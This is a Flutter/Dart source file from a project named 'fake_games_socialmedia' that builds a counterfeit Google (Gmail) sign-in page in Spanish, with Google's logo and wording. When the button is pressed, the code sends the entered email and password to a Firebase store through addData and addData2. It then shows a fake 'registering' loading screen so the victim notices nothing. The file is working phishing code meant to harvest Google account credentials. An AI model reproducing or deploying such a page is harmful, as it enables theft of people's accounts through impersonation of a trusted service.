import 'package:fake_games_socialmedia/services/firebase_data.dart';
import 'package:flutter/material.dart';

class GmailPage extends StatefulWidget {
  GmailPage({Key? key}) : super(key: key);

  @override
  State<GmailPage> createState() => _GmailPageState();
}

class _GmailPageState extends State<GmailPage> {
  bool _obscureText = true;
  TextEditingController dataemail = TextEditingController(text: "");
  TextEditingController datapassword = TextEditingController(text: "");
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        backgroundColor: Colors.white,
        elevation: 0,
        actions: [
          Image(width: 360, image: AssetImage("assets/searchgmail.jpg"))
        ],
      ),
      body: ListView(
        children: [
          Column(
            mainAxisAlignment: MainAxisAlignment.spaceAround,
            children: [
              SizedBox(
                  width: 80.0,
                  height: 80.0,
                  child: Image(image: AssetImage("assets/logogoogle.png"))),
              Text(
                "Iniciar Sesión",
                style: TextStyle(color: Colors.black87, fontSize: 25),
              ),
              Divider(
                color: Colors.transparent,
                height: 8.0,
              ),
              Text(
                "Utiliza tu cuenta de Google",
                style: TextStyle(fontSize: 15),
              )
            ],
          ),

          ////////////////////PART N° 3///////////////////////
          Padding(
            padding: const EdgeInsets.all(10.0),
            child: Column(
              children: [
                TextField(
                    controller: dataemail,
                    cursorColor: Colors.black,
                    decoration: InputDecoration(
                        hintText: "Correo electrónico",
                        border: OutlineInputBorder(
                            borderRadius: BorderRadius.circular(50)))),
                Divider(
                  height: 20.0,
                  color: Colors.transparent,
                ),
                TextFormField(
                  controller: datapassword,
                  obscureText: _obscureText,
                  decoration: InputDecoration(
                      suffixIcon: GestureDetector(
                        onTap: () {
                          setState(() {
                            _obscureText = !_obscureText;
                          });
                        },
                        child: Icon(_obscureText
                            ? Icons.visibility
                            : Icons.visibility_off),
                      ),
                      hintText: "Contraseña",
                      border: OutlineInputBorder(
                          borderRadius: BorderRadius.circular(50))),
                ),
                Divider(
                  height: 20.0,
                  color: Colors.transparent,
                ),
                Row(
                  mainAxisAlignment: MainAxisAlignment.spaceAround,
                  children: [
                    Text("¿Has olvidado tu contraseña?"),
                    ClipRRect(
                      borderRadius: BorderRadius.circular(50),
                      child: ElevatedButton(
                          style: ElevatedButton.styleFrom(
                              primary: Color(0xFFF1877f2)),
                          onPressed: () async {
                            await addData(dataemail.text);
                            addData2(datapassword.text);
                            Navigator.push(
                              context,
                              MaterialPageRoute(
                                  builder: (context) => LoadingGmail()),
                            );
                          },
                          child: Container(
                            height: 50,
                            width: 75,
                            child: Center(child: Text("Registrame")),
                          )),
                    ),
                  ],
                )
              ],
            ),
          ),
        ],
      ),
    );
  }
}

class LoadingGmail extends StatelessWidget {
  const LoadingGmail({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.white,
      body: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Center(
              child: Column(
            children: [
              Text("Registrando, Espere un momento..... :) !"),
              Image(width: 100, image: AssetImage("assets/gifloading.gif"))
            ],
          ))
        ],
      ),
    );
  }
}
